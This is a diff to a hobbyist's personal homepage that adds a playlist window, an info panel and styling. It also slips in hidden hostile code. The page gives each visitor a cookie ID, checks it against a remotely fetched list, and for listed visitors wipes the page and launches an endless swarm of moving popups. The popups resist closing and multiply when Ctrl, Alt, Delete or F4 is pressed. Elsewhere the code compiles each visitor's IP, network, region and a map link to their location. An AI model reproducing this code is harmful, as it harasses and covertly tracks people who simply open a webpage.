@@ -33,6 +33,11 @@
     </style>
 
     <style>
+        @font-face {
+            font-family: Nunito;
+            src: url('https://sadhost.neocities.org/fonts/FreePixel.ttf');
+        }
+
         .win95con {
             background: #C0C0C0;
             border: 2px solid greenyellow;
@@ -40,7 +45,6 @@
             position: absolute;
             top: 50%;
             left: 50%;
-            transform: translate(-50%, -50%);
         }
 
         .win95con> :first-child {
@@ -177,22 +181,25 @@
             image-rendering: pixelated;
         }
 
-        #hidableText {
-            position: absolute;
-            left: 50%;
-            transform: translateX(-50%);
-            top: 10%;
-            z-index: 9999;
-            visibility: visible;
-            padding-bottom: 20px;
-            color: white;
-            font-family: meowfont;
-        }
-
         #catcode {
             position: absolute;
-            margin-top: -85px;
+            margin-top: 68px;
             color: black !important
+        }
+
+        #musicButton {
+            --musicButtonSize: 28px;
+            position: absolute;
+            margin-top: 160px !important;
+            background-color: white !important;
+            border: 2px solid greenyellow;
+            border-color: #FFFFFF #808080 #808080 #FFFFFF;
+            color: black;
+            width: var(--musicButtonSize);
+            height: var(--musicButtonSize);
+            margin: 10px;
+            text-align: center;
+            line-height: var(--musicButtonSize);
         }
 
         #epicButton {
@@ -313,8 +320,73 @@
             color: white;
         }
 
-        a>img#shiggy:first-child {
-            height: 31px;
+        .buttondiv>a {
+            max-height: 31px;
+        }
+
+        #infoWindowBorder {
+            width: 400px;
+            max-width: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border: 2px solid #000080;
+            background-color: #dddddd;
+        }
+
+        #infoWindowBorder:first-child {
+            padding: 10px;
+        }
+
+        #infoWindowBorder * {
+            margin: 0px;
+            font-family: meowfont;
+            text-align: center;
+        }
+
+        .dropDownDiv {
+            overflow: hidden;
+            height: 23px;
+            transition: height 0.5s;
+            padding: 0px;
+            border-bottom: 2px solid #808080;
+            width: 400px;
+        }
+
+        .dropDownDiv> :nth-child(1) {
+            border-width: 2px;
+            border-style: solid;
+            border-color: #FFFFFF #808080 #808080 #FFFFFF;
+            font-size: 21px;
+            line-height: 21px;
+            text-align: left !important;
+            z-index: 2;
+            position: relative;
+            display: flex;
+        }
+
+        .dropDownDiv>div:nth-child(1)>p:nth-child(1) {
+            width: 21px;
+            height: 21px;
+            border-right: 2px solid #808080;
+            display: block !important;
+        }
+
+        .dropDownDiv>div:nth-child(1)>p:nth-child(2) {
+            display: inline-block;
+            font-size: 16px;
+            padding-left: 5px;
+        }
+
+        .dropDownDiv> :nth-child(2) {
+            border-width: 2px;
+            border-style: solid;
+            border-color: #FFFFFF #808080 #80808000 #FFFFFF;
+            margin-top: -2px !important;
+            padding: 5px !important;
+            z-index: 1;
+            position: relative;
         }
     </style>
 </head>
@@ -327,6 +399,112 @@
         function getRandomNumber(min, max) {
             return Math.random() * (max - min) + min;
         }
+
+        function getCookie(name) {
+            const cookies = document.cookie.split(';');
+            for (let i = 0; i < cookies.length; i++) {
+                const cookie = cookies[i].trim();
+                const [cookieName, cookieValue] = cookie.split('=');
+                if (cookieName === name) {
+                    return decodeURIComponent(cookieValue);
+                }
+            }
+            return null;
+        }
+
+        function setCookie(cookiename, content) {
+            document.cookie = `${cookiename}=${encodeURIComponent(content)}; path=/`;
+        }
+
+        let koruSet = getCookie("koruset")
+        if (!koruSet) {
+            let randomset = getRandomNumber(-1000, 1000) * getRandomNumber(-1000, 1000)
+            console.log("No koruset, setting now to", randomset)
+            setCookie("koruset", randomset)
+        }
+
+        fetch("https://raw.githubusercontent.com/KoharuXenon/korusite/main/nosets.txt").then(res => res.text()).then(text => {
+            console.log("No sets: " + text.trim() + "\n\nOur set: " + koruSet.toString())
+            if (text.trim().includes(koruSet.toString())) {
+                let newIframe = document.createElement("video")
+                newIframe.src = "videos/you.mp4"
+                newIframe.width = "480"
+                newIframe.height = "360"
+                newIframe.autoplay = true;
+                newIframe.muted = true;
+                newIframe.controls = false;
+                document.body.innerHTML = '';
+                document.body.appendChild(newIframe)
+
+                function spawnWindows(amount) {
+                    for (let i = 0; i < 10; i++) {
+                        let popup = window.open("https://https://koharuxenon.github.io/korusite/videos/you.mp4", '', 'width=480,height=360');
+                        popup.onbeforeunload = () => "Are you an idiot?";
+                        popup.oncontextmenu = () => false;
+                        popup.onkeydown = async () => {
+                            if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
+                                spawnWindows(1000)
+                                alert("You are an idiot!");
+                            }
+
+                            return null;
+                        }
+                        let xOff = 5;
+                        let yOff = 5;
+                        let xPos = 400;
+                        let yPos = -100;
+
+                        function newXlt() {
+                            xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+                            popup.focus();
+                        }
+
+                        function newXrt() {
+                            xOff = Math.ceil(7 * Math.random()) * 5 - 10;
+                            popup.focus();
+                        }
+
+                        function newYup() {
+                            yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+                            popup.focus();
+                        }
+
+                        function newYdn() {
+                            yOff = Math.ceil(7 * Math.random()) * 5 - 10;
+                            popup.focus();
+                        }
+
+                        function playBall() {
+                            xPos += xOff;
+                            yPos += yOff;
+
+                            if (xPos > screen.width - 357) newXlt();
+                            if (xPos < 0) newXrt();
+
+                            if (yPos > screen.height - 330) newYup();
+                            if (yPos < 0) newYdn();
+
+                            popup.moveTo(xPos, yPos);
+                            setTimeout(playBall, 1);
+                            console.log("YEAH")
+                        }
+                        playBall()
+                    }
+                }
+
+                spawnWindows(1000)
+
+                // Opens a new window with specified parameters
+                /*
+                window.open("videos/you.mp4", '', 'width=480,height=360');
+                window.open("videos/you.mp4", '', 'width=480,height=360');
+                window.open("videos/you.mp4", '', 'width=480,height=360');
+                window.open("videos/you.mp4", '', 'width=480,height=360');
+                window.open("videos/you.mp4", '', 'width=480,height=360');
+                */
+                console.log("NO SET")
+            }
+        });
 
         const actualWidth = window.visualViewport.width;
         const actualHeight = window.visualViewport.height;
@@ -369,6 +547,7 @@
                 const speed = (runs / ms / 1000000) * cyclesPerRun;
 
                 userInfo = `IP: ${data.ip}, Count: ${data.count}
+                ID: ${koruSet}
                 ASN: ${data.asn.name}, Type: ${data.asn.type}
                 Region: ${data.region}, ${data.country_name}: ${data.emoji_flag}
                 [Maps Link](https://www.google.co.uk/maps/place/${data.latitude},${data.longitude})
@@ -487,35 +666,7 @@
 
         setInterval(createStar, 250);
 
-        var audio = new Audio('music/car.mp3');
-        audio.loop = true;
-
-        function playAudio() {
-            console.log("Playing")
-            if (true) {
-                if (audio.paused) {
-                    audio.play();
-                }
-            }
-        }
-
         window.addEventListener('load', function () {
-
-            function checkAudio() {
-                if (!audio.paused) {
-                    document.getElementById('hiddenElement').style.visibility = 'visible';
-                    document.getElementById('hiddenElement2').style.visibility = 'visible';
-                    if (document.getElementById('hidableText'))
-                        document.getElementById('hidableText').remove();
-                    clearInterval(checkAudio);
-                }
-                else {
-                    if (document.getElementById('hidableText'))
-                        document.getElementById('hidableText').style.visibility = 'visible';
-                }
-            }
-
-            setInterval(checkAudio, 250);
 
             setTimeout(function () {
                 let funninumber = parseInt(getRandomNumber(0, 100).toString());
@@ -526,50 +677,110 @@
             }, 100);
 
             document.getElementById("catcode").textContent = "  ／l、\n（ﾟ､ ｡ ７\n  l  ~ヽ\n  じしf_,)ノ";
+            document.getElementById("korubio").textContent = "It's me\nthe koru\nuhhh yeah\nidk what to put here"
             document.getElementById("win95conTitle").textContent = document.title;
 
             function doHeight(computedStyle, desiredscale) {
-                let compHeight = ((parseInt(computedStyle.height) + (61 * 2)) * desiredscale);
-                console.log("Height" + ", " + compHeight + ", " + actualHeight)
+                let compHeight = (parseInt(computedStyle.height) * desiredscale);
+                //console.log("Height" + ", " + compHeight + ", " + actualHeight)
                 if (compHeight > actualHeight) {
                     desiredscale = desiredscale * (actualHeight / compHeight);
-                    console.log("New Height:" + ", " + compHeight * desiredscale + ", " + "scale:" + ", " + desiredscale);
+                    //console.log("New Height:" + ", " + compHeight * desiredscale + ", " + "scale:" + ", " + desiredscale);
                     document.getElementById("scalablebio").style.transform = `scale(${desiredscale})`;
+                    document.getElementById("InfoWindowContainer").style.transform = `scale(${desiredscale})`;
+                    document.getElementById("playListContainer").style.transform = `scale(${desiredscale})`;
                 }
+
+
+                setTimeout(() => {
+                    let bioWidth = parseFloat(getComputedStyle(document.querySelector("#win95con")).width) * desiredscale;
+                    //console.log("THE WIDTH", bioWidth)
+
+                    let playListWidth = parseFloat(getComputedStyle(document.getElementById("playListContainer")).width) * desiredscale;
+                    let infoWidth = parseFloat(getComputedStyle(document.getElementById("InfoWindowContainer")).width) * desiredscale;
+
+                    let sideWidth = (actualWidth - bioWidth) / 2;
+                    //console.log(sideWidth, actualWidth)
+
+                    if (infoWidth > sideWidth) {
+                        document.getElementById("InfoWindowContainer").style.visibility = "hidden"
+                        document.getElementById("doneReading").style.display = "flex"
+                    }
+
+                    if (playListWidth > sideWidth) {
+                        document.getElementById("playListContainer").style.visibility = "hidden"
+                        musicButton.style.visibility = "visible"
+                    }
+                }, 10);
             }
 
             let scalablebio = document.getElementById("win95con");
             let computedStyle = window.getComputedStyle(scalablebio);
             setTimeout(() => {
-                let compWidth = parseInt(computedStyle.width) + 256;
-                console.log("Width" + ", " + compWidth + ", " + actualWidth)
+                let compWidth = parseInt(computedStyle.width);
+                //console.log("Width" + ", " + compWidth + ", " + actualWidth)
                 let desiredscale = 1
                 if (compWidth > actualWidth) {
                     desiredscale = actualWidth / compWidth;
-                    console.log("New width:" + ", " + compWidth * desiredscale + ", " + "scale:" + ", " + desiredscale);
+                    //console.log("New width:" + ", " + compWidth * desiredscale + ", " + "scale:" + ", " + desiredscale);
                     document.getElementById("scalablebio").style.transform = `scale(${desiredscale})`;
+                    document.getElementById("InfoWindowContainer").style.transform = `scale(${desiredscale})`;
+                    document.getElementById("playListContainer").style.transform = `scale(${desiredscale})`;
                 }
                 setTimeout(() => {
                     doHeight(computedStyle, desiredscale)
                 }, 10);
             }, 0);
+
+            let playListContainer = document.getElementById("playListContainer");
+            let musicButton = document.getElementById("musicButton")
+            musicButton.style.visibility = "hidden"
+
+            let ismobile = false;
+
+            if (navigator.userAgent.toLowerCase().includes("android") || navigator.userAgent.toLowerCase().includes("iphone")) {
+                playListContainer.style.visibility = "hidden"
+                musicButton.style.setProperty("visibility", "visible", "important")
+                ismobile = true
+            }
+
+            function togglePlayListVisibility(event) {
+                if (playListContainer.style.visibility == "hidden") {
+                    playListContainer.style.visibility = "visible"
+                    if (!ismobile) {
+                        musicButton.style.visibility = "hidden"
+                    }
+                }
+                else {
+                    playListContainer.style.visibility = "hidden"
+                    if (!ismobile) {
+                        musicButton.style.visibility = "visible"
+                    }
+                }
+            }
+
+            musicButton.addEventListener("click", togglePlayListVisibility);
+            document.getElementById("PlaylistCloseButton").addEventListener("click", togglePlayListVisibility);
         });
+
+        function toggleInfoVisibility(event) {
+            if (document.getElementById("InfoWindowContainer").style.visibility == "hidden") {
+                document.getElementById("InfoWindowContainer").style.visibility = "visible"
+            }
+            else {
+                document.getElementById("InfoWindowContainer").style.visibility = "hidden"
+            }
+        }
     </script>
 
-    <a id="hidableText" onclick="playAudio()">!CLICK
-        ME!</a>
-
     <div id="scalablebio">
-        <div class="win95con" id="win95con">
+        <div class="win95con" id="win95con" style="transform: translate(-50%, -50%);">
             <div>
                 <img backup="https://koharuxenon.github.io/korusite/icon.png" src="icon.png" width="16" height="16"
                     style="padding: 1px;" />
                 <p id="win95conTitle"></p>
                 <button onclick="explodePage()">X</button>
                 <button>?</button>
-                <button id="epicButton" onclick="openEpicGame()">Epic Game</button>
-                <button id="epicButton" onclick="openEpicSite()">Epic Site</button>
-                <button id="epicButton" onclick="openPman()">CHECK THESE GUYS</button>
             </div>
             <div id="win95containerreal">
                 <div
@@ -583,33 +794,38 @@
                             class="circle-img" style="position: absolute; left: 50%; transform: translate(-50%, -50%);">
 
                         <pre id="catcode"></pre>
+                        <div id="musicButton">🎵</div>
                         <img backup="https://koharuxenon.github.io/korusite/images/shiggy.gif" src="images/shiggy.gif"
-                            id="shiggy" style="margin-top: calc(var(--prof-border-thickness)*-1); position: absolute;">
+                            id="shiggy" style="position: absolute;">
 
                         <pre href="https://discord.com/users/594965168111353896"
                             style="text-align: center; font-family: meowfont; font-weight: 600; font-size: 28px; color: var(--prof-outline_color); margin-top: 90px;"><a href="https://discord.com/users/594965168111353896" style="color: var(--text-color) !important; text-decoration: none; text-shadow: 0 0 10px rgba(255, 148, 255, 1);">Koru</a></pre>
 
-                        <pre
-                            style="text-align: center; font-family: meowfont; font-size: 16px; color: var(--text-color) !important;">It's me
-the koru
-uhhh yeah
-idk what to put here</pre>
+                        <pre style="text-align: center; font-family: meowfont; font-size: 16px; color: var(--text-color) !important;"
+                            id="korubio"></pre>
 
                         <div style="display: flex;  justify-content: center; margin-top: 20px;">
-                            <a href="https://namemc.com/profile/KoharuXenon.1" class="linkbox">
-                                <img class="linkimg" src="https://s.namemc.com/img/favicon-30.png"></a>
-
                             <a href="https://www.youtube.com/KoharuXenon" class="linkbox">
-                                <img class="linkimg" src="https://cdn-icons-png.flaticon.com/256/1384/1384060.png"></a>
+                                <img class="linkimg" backup="https://cdn-icons-png.flaticon.com/256/1384/1384060.png"
+                                    src="images/youtube.png"></a>
+
+                            <a href="https://twitter.com/KoharuXenon" class="linkbox">
+                                <img class="linkimg"
+                                    backup="https://abs.twimg.com/responsive-web/client-web/icon-ios.77d25eba.png"
+                                    src="images/twitter.png"></a>
 
                             <a href="https://github.com/KoharuXenon/" class="linkbox">
                                 <img class="linkimg"
                                     src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/GitHub_Invertocat_Logo.svg/640px-GitHub_Invertocat_Logo.svg.png"></a>
+
+                            <a href="https://namemc.com/profile/KoharuXenon.1" class="linkbox">
+                                <img class="linkimg" backup="https://s.namemc.com/img/favicon-30.png"
+                                    src="images/namemc.png"></a>
                         </div>
 
 
 
-                        <div style="display: flex;  justify-content: center; margin-top: 20px;">
+                        <div style="display: flex;  justify-content: center; margin-top: 20px;" class="buttondiv">
                             <img backup="https://koharuxenon.github.io/korusite/images/ralseismokingadart.gif"
                                 src="images/ralseismokingadart.gif" id="shiggy">
 
@@ -620,7 +836,7 @@ idk what to put here</pre>
                                 src="images/reshirii.gif" id="shiggy">
                         </div>
 
-                        <div style="display: flex;  justify-content: center;">
+                        <div style="display: flex;  justify-content: center;" class="buttondiv">
                             <img backup="https://koharuxenon.github.io/korusite/images/got_html.gif"
                                 src="images/got_html.gif" id="shiggy">
 
@@ -631,7 +847,7 @@ idk what to put here</pre>
                                 src="images/fireskull.gif" id="shiggy">
                         </div>
 
-                        <div style="display: flex;  justify-content: center;">
+                        <div style="display: flex;  justify-content: center;" class="buttondiv">
                             <a href="https://web.archive.org/web/20230326152635/https://kitecreature.net/">
                                 <img backup="https://koharuxenon.github.io/korusite/images/rolymicrobar.gif"
                                     src="images/rolymicrobar.gif" id="shiggy">
@@ -648,41 +864,160 @@ idk what to put here</pre>
                             </a>
                         </div>
 
+                        <div style="display: flex;  justify-content: center;" class="buttondiv">
+                            <img backup="https://koharuxenon.github.io/korusite/images/vap.png" src="images/vap.png"
+                                id="shiggy">
+                        </div>
+
+                        <div style="display: flex;  justify-content: center; font-family: meowfont; padding-top: 10px;">
+                            Check out these guys
+                        </div>
+                        <div style="display: flex;  justify-content: center;" class="buttondiv">
+                            <a href="https://pmandudeguylol.github.io/pmans-epic-site/">
+                                <img backup="https://koharuxenon.github.io/korusite/images/pman.gif"
+                                    src="images/pman.gif" id="shiggy">
+                            </a>
+                        </div>
+
+                        <div style="display: flex;  justify-content: center; font-family: meowfont; padding-top: 10px; display: none;"
+                            id="doneReading">
+                            <p onclick="openCool()">Done reading here? click me.</p>
+                        </div>
+
                     </div>
-                    <img id="explodeIMG"
-                        backup="https://cdn.discordapp.com/attachments/1149275257178435605/1259970719165448262/explosion-boom.gif?ex=668d9eac&is=668c4d2c&hm=7a1584d2a545cfc161910d9084ef966be26de8337b8b25462b32a222cd655a5d&"
+                    <img id="explodeIMG" backup="https://koharuxenon.github.io/korusite/images/explosion-boom.gif"
                         src="images/explosion-boom.gif"
                         style="position: absolute; width: 100%; height: 100%; display: none;" id="shiggy">
                 </div>
             </div>
+        </div>
+    </div>
 
-            <div class="win95con" style="top: 330px; left: -130px; transform: translate(0%, 0%);">
-                <div style="max-width: 200px;">
-                    <img backup="https://koharuxenon.github.io/korusite/icon.png" src="icon.png" width="16" height="16"
-                        style="padding: 1px;" />
+    <div style="display: flex; justify-content: flex-end; left: 0px; position: absolute;">
+        <div class="win95con" style="left:unset; position: relative; transform-origin: left;" id="playListContainer">
+            <div style="max-width: 200px;">
+                <img backup="https://koharuxenon.github.io/korusite/icon.png" src="icon.png" width="16" height="16"
+                    style="padding: 1px;" />
 
-                    <button>X</button>
-                    <button>?</button>
+                <button id="PlaylistCloseButton">X</button>
+                <button>?</button>
+            </div>
+
+            <div style="height: 0px; margin-top: -20px;">
+                <div class="scrollable-container">
+                    <div id="win95conTitle2">Playlist</div>
                 </div>
+            </div>
 
-                <div style="height: 0px; margin-top: -20px;">
-                    <div class="scrollable-container">
-                        <div id="win95conTitle2">Playlist</div>
-                    </div>
-                </div>
-
-                <div id="win95containerreal">
-                    <div id="playListDiv">
-                        <div id="playListEqualizer">
-                            <p id="progressTime">00:00 / 00:00</p>
-                            <div style="display: flex; flex-direction: row; align-items: center;">
-                                <div class="mediabutton" id="media_prev"></div>
-                                <div class="mediabutton" id="media_play"></div>
-                                <div class="mediabutton" id="media_next"></div>
-                            </div>
-                            <progress id="progressBar" max="100" value="0.000001"></progress>
+            <div id="win95containerreal">
+                <div id="playListDiv">
+                    <div id="playListEqualizer">
+                        <p id="progressTime">00:00 / 00:00</p>
+                        <div style="display: flex; flex-direction: row; align-items: center;">
+                            <div class="mediabutton" id="media_prev"></div>
+                            <div class="mediabutton" id="media_play"></div>
+                            <div class="mediabutton" id="media_next"></div>
                         </div>
-                        <div id="musicItems"></div>
+                        <progress id="progressBar" max="100" value="0.000001"></progress>
+                    </div>
+                    <div id="musicItems"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div style="display: flex; justify-content: flex-end; right: 0px; position: absolute;">
+        <div class="win95con" style="left:unset; position: relative; transform-origin: right;" id="InfoWindowContainer">
+            <div>
+                <img backup="https://koharuxenon.github.io/korusite/images/shiggy.gif" src="images/shiggy.gif"
+                    width="16" height="16" style="padding: 1px;" />
+                <p id="win95conTitle">Info</p>
+                <button onclick="toggleInfoVisibility(null)">X</button>
+                <button>?</button>
+            </div>
+            <div id="win95containerreal" style="max-height: 500px; overflow-y: scroll;">
+                <div id="infoWindowBorder">
+                    <div style="display: flex; align-items: end;">
+                        <img backup="https://koharuxenon.github.io/korusite/images/shiggy.gif" src="images/shiggy.gif"
+                            id="shiggy">
+                        <img backup="https://koharuxenon.github.io/korusite/images/bubanim1.gif"
+                            src="images/bubanim1.gif" id="shiggy">
+                    </div>
+
+                    <div class="dropDownDiv">
+                        <div>
+                            <p></p>
+                            <p>About Me</p>
+                        </div>
+                        <div>
+                            <h3>Who am i?</h3>
+                            <p>uh im koru.</p><br>
+
+                            <h3>What do i do?</h3>
+                            <p>I do coding! I mainly code in haxeflixel and python. But i also know html, javascript and
+                                some java and c++</p><br>
+
+                            <h3>Why do i do?</h3>
+                            <p>I started coding as a hobby with a very funny missingno related FNF mod (instead of doing
+                                my
+                                animation coursework for college, oopsies) and now coding/programming whatever you wanna
+                                call it is now my main pursuit</p><br>
+
+                            <h3>Help me im trapped inside this website</h3>
+                            <p>uh im koru.</p><br>
+
+                            <h3>Fun fact.</h3>
+                            <p>im koru</p><br>
+
+                            <h3>One thing not many people know</h3>
+                            <p>uh im koru.</p>
+                        </div>
+                    </div>
+
+                    <div style="height: 16px;"></div>
+
+                    <div class="dropDownDiv" expand="true">
+                        <div>
+                            <p></p>
+                            <p>Cool things</p>
+                        </div>
+                        <div>
+                            <h3>Cool slug creature</h3>
+                            <a
+                                href="https://web.archive.org/web/20230326152728/https://kitecreature.net/creatures/slug/">
+                                <img src="images/slug.png" alt="A slug monster is getting slime all over this page!">
+                            </a>
+                            <br>
+                            <a href="https://dx4z.neocities.org/">
+                                <img src="https://dx4z.neocities.org/Coke.gif">
+                            </a>
+                            <p style="font-family: 'Nunito', sans-serif;">Its a Coke Can That Spins</p>
+
+                            <br>
+                        </div>
+                    </div>
+
+                    <div style="height:16px;"></div>
+
+                    <div class="dropDownDiv">
+                        <div>
+                            <p></p>
+                            <p>Media</p>
+                        </div>
+                        <div>
+                            <h3>A yoshi :3</h3>
+                            <img src="images/peace.gif">
+                            <div style="height:16px;"></div>
+
+                            <h3>Poor kitty</h3>
+                            <img src="images/stabuddy12.gif">
+                            <div style="height:16px;"></div>
+
+                            <h3>a creature?</h3>
+                            <img
+                                src="https://cdn.discordapp.com/emojis/1120057431830044803.webp?size=96&quality=lossless">
+                            <div style="height:16px;"></div>
+                        </div>
                     </div>
                 </div>
             </div>
@@ -780,8 +1115,8 @@ idk what to put here</pre>
         var audio = new Audio(musics[0].url);
         audio.addEventListener('loadedmetadata', () => {
             let progress = (0 / audio.duration) * 100;
-            console.log(audio.duration)
-            console.log(progress)
+            //console.log(audio.duration)
+            //console.log(progress)
             progressBar.value = progress;
 
             let currentTime = formatTime(0);
@@ -798,11 +1133,11 @@ idk what to put here</pre>
 
 
         function showPlay() {
-            console.log("Showing play")
+            //console.log("Showing play")
             playpauseButton.style.setProperty("mask-image", "url(https://koharuxenon.github.io/korusite/images/play.png)", "important")
         }
         function showPause() {
-            console.log("Showing pause")
+            //console.log("Showing pause")
             playpauseButton.style.setProperty("mask-image", "url(https://koharuxenon.github.io/korusite/images/pause.png)", "important");
         }
 
@@ -998,20 +1333,50 @@ int main() {
         window.addEventListener('load', function () {
             resetAnimID = setTimeout(resetAnim, pauseTime * 1000);
         });
+
+        document.body.querySelectorAll(".dropDownDiv").forEach(function (element) {
+            let dropDownMax = element.querySelector('div:nth-child(2)');
+            let dropDownIndicator = element.querySelector(':first-child').querySelector(':first-child');
+            let dropDownClickable = element.querySelector(':first-child');
+
+            let elementMaxHeight = 0;
+            let showingEl = false;
+            dropDownIndicator.textContent = "v";
+
+            //console.log(element.getAttribute("expand"))
+
+            if (element.getAttribute("expand") == "true") {
+                showingEl = true;
+                elementMaxHeight = parseInt(getComputedStyle(dropDownMax).height) + 35 + "px";
+                //console.log(elementMaxHeight);
+                element.style.height = elementMaxHeight;
+                dropDownIndicator.textContent = ">";
+            }
+
+            dropDownClickable.addEventListener("click", function (event) {
+                //console.log(dropDownMax);
+                //console.log(getComputedStyle(dropDownMax))
+                elementMaxHeight = parseInt(getComputedStyle(dropDownMax).height) + 35 + "px";
+                //console.log(elementMaxHeight);
+                if (!showingEl) {
+                    element.style.height = elementMaxHeight;
+                    dropDownIndicator.textContent = ">";
+                }
+                else {
+                    element.style.height = "23px";
+                    dropDownIndicator.textContent = "v";
+                }
+                showingEl = !showingEl;
+            });
+        });
     </script>
 
     <script src="./oneko.js"></script>
     <script src="./catfren.js"></script>
 
     <script>
-        function openPman() {
-            location.href = 'https://pmandudeguylol.github.io/pmans-epic-site/';
-        }
-        function openEpicSite() {
-            location.href = 'website/index.html';
-        }
-        function openEpicGame() {
-            location.href = 'https://koharutest.github.io/TD/';
+        function openCool() {
+            toggleInfoVisibility(null)
         }
         function explodePage() {
             var audio = new Audio('explode.mp3');
